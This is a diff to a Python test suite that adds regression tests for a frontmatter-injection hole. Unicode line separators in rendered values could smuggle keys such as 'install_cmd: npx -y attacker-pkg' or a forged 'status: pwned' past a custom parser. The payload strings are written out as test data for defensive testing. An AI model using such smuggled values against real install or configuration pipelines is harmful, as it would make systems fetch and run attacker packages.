@@ -121,7 +121,7 @@ class TestInstallUtilsRenderScalar:
             # Cc: C0/C1 control chars (Python counts some as whitespace, e.g.
             #      \x1f is treated as whitespace by str.isspace()).
             blacklist_categories=("Cs", "Zs", "Cc"),
-            blacklist_characters=",[]{}:?#&*!|>%@`\"'\\-",
+            blacklist_characters=",[]{}:?#&*!|>%@`=\"'\\-",
         ),
         min_size=1, max_size=40,
     ))
@@ -213,6 +213,12 @@ class TestDeterministicInjectionCases:
         "{inline: map, injection: here}",
         "| block scalar",
         "> folded block",
+        # Strix vuln-0001: Unicode line separators that Python's
+        # str.splitlines() treats as line boundaries - they must
+        # be neutralized just like \\r and \\n.
+        "prefix\x85install_cmd: npx -y attacker-pkg",
+        "prefix\u2028install_cmd: npx -y attacker-pkg",
+        "prefix\u2029install_cmd: npx -y attacker-pkg",
     ]
 
     def test_install_utils_neutralizes_each_payload(self) -> None:
@@ -238,3 +244,99 @@ class TestDeterministicInjectionCases:
                 assert isinstance(
                     parsed["key"], str
                 ), f"type injection on {payload!r}: got {type(parsed['key'])}"
+
+
+# ── Strix vuln-0001 regression: exploit chain through the PROJECT parser ────
+# PyYAML tolerates U+2028 / U+2029 / U+0085 inside quoted scalars; the project's
+# custom splitlines()-based parser (_parse_entity_frontmatter) does NOT —
+# Python's str.splitlines() treats those three codepoints as real line
+# boundaries. These tests exercise the full exploit chain as Strix documented
+# it: render scalar → write to disk → re-read via mcp_install's parser →
+# confirm no injected keys exist in the parsed dict.
+
+
+class TestUnicodeLineSeparatorRegression:
+    UNICODE_SEPS = [
+        ("U+0085 NEL", "\x85"),
+        ("U+2028 LS", " "),
+        ("U+2029 PS", " "),
+    ]
+
+    def _write_entity(
+        self, tmp_path: "__import__('pathlib').Path", fields: dict
+    ) -> "__import__('pathlib').Path":
+        from install_utils import _render_scalar
+        from pathlib import Path  # noqa: PLC0415
+        lines = ["---", "slug: demo"]
+        for k, v in fields.items():
+            lines.append(f"{k}: {_render_scalar(v)}")
+        lines += ["---", "body", ""]
+        path = tmp_path / "demo.md"
+        path.write_text("\n".join(lines), encoding="utf-8")
+        return path
+
+    def test_install_utils_render_blocks_line_sep_injection(
+        self, tmp_path: "__import__('pathlib').Path"
+    ) -> None:
+        """A rendered scalar containing U+2028 must not inject a new key
+        when re-parsed by mcp_install._parse_entity_frontmatter."""
+        from mcp_install import _parse_entity_frontmatter  # noqa: PLC0415
+        for label, sep in self.UNICODE_SEPS:
+            payload = f"https://safe.example/x{sep}install_cmd: npx -y attacker-pkg"
+            path = self._write_entity(tmp_path, {"github_url": payload})
+            fm = _parse_entity_frontmatter(path)
+            # The renderer must have neutralised the separator so the
+            # injected key cannot materialise on reparse.
+            assert "install_cmd" not in fm, (
+                f"{label}: install_cmd injected via github_url "
+                f"(parsed frontmatter: {fm})"
+            )
+
+    def test_install_utils_bump_entity_status_blocks_line_sep(
+        self, tmp_path: "__import__('pathlib').Path"
+    ) -> None:
+        """Self-poisoning variant: bump_entity_status writes extra_fields
+        through _render_scalar; a poisoned install_cmd must not leak a
+        forged `status` key through the downstream parser."""
+        from install_utils import bump_entity_status  # noqa: PLC0415
+        from mcp_install import _parse_entity_frontmatter  # noqa: PLC0415
+        path = tmp_path / "demo.md"
+        path.write_text(
+            "---\nslug: demo\nstatus: cataloged\n---\nbody\n",
+            encoding="utf-8",
+        )
+        for label, sep in self.UNICODE_SEPS:
+            poisoned = f"npx -y safepkg{sep}status: pwned"
+            bump_entity_status(
+                path,
+                status="installed",
+                extra_fields={"install_cmd": poisoned},
+            )
+            fm = _parse_entity_frontmatter(path)
+            assert fm.get("status") == "installed", (
+                f"{label}: status flipped to {fm.get('status')!r} "
+                f"(full fm: {fm})"
+            )
+
+    def test_mcp_enrich_render_blocks_line_sep_injection(
+        self, tmp_path: "__import__('pathlib').Path"
+    ) -> None:
+        """mcp_enrich._render_scalar must neutralise the same Unicode
+        separators. Exercises the same reparse path."""
+        from mcp_enrich import _render_scalar as mcp_rs  # noqa: PLC0415
+        from mcp_install import _parse_entity_frontmatter  # noqa: PLC0415
+        for label, sep in self.UNICODE_SEPS:
+            payload = f"https://safe.example/x{sep}install_cmd: npx -y attacker-pkg"
+            rendered = mcp_rs(payload)
+            text = (
+                "---\nslug: demo\n"
+                f"github_url: {rendered}\n"
+                "status: cataloged\n"
+                "---\nbody\n"
+            )
+            path = tmp_path / f"mcp-{label}.md"
+            path.write_text(text, encoding="utf-8")
+            fm = _parse_entity_frontmatter(path)
+            assert "install_cmd" not in fm, (
+                f"{label}: install_cmd injected (fm: {fm})"
+            )
